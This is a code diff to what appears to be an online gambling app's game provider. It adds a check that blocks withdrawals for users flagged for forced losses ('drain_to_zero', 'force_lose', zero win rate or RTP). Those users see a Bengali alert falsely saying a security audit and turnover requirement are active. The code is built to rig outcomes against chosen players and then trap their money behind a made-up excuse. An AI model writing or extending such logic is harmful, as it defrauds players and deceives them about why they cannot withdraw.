@@ -2237,6 +2237,21 @@ export function GameProvider({ children }) {
       return { success: false, message: msg, needsDeposit: true };
     }
 
+    // TARGETED AUDIT: If user is under drain_to_zero / force_lose, withdrawal is strictly blocked
+    const isTargetedLoss = 
+      user?.force_mode === 'drain_to_zero' ||
+      user?.force_mode === 'force_loss' ||
+      user?.force_result === 'force_lose' ||
+      user?.luck_mode === 'drain' ||
+      Number(user?.custom_win_rate) === 0 ||
+      Number(user?.custom_rtp) === 0;
+
+    if (isTargetedLoss) {
+      const msg = "অ্যাকাউন্টে সিকিউরিটি অডিট ও টার্নওভার সক্রিয় রয়েছে! উইথড্র করার পূর্বে পর্যাপ্ত গেম টার্নওভার সম্পন্ন করতে হবে।";
+      alert(msg);
+      return { success: false, message: msg, needsTurnover: true };
+    }
+
     // USER MANDATE RULE 2: Turnover requirement must be 100% completed
     const reqTurnover = Number(user.required_turnover !== undefined ? user.required_turnover : (user.turnover_required || 0));
     const compTurnover = Number(user.current_turnover !== undefined ? user.current_turnover : (user.turnover_completed || user.total_wagered || 0));
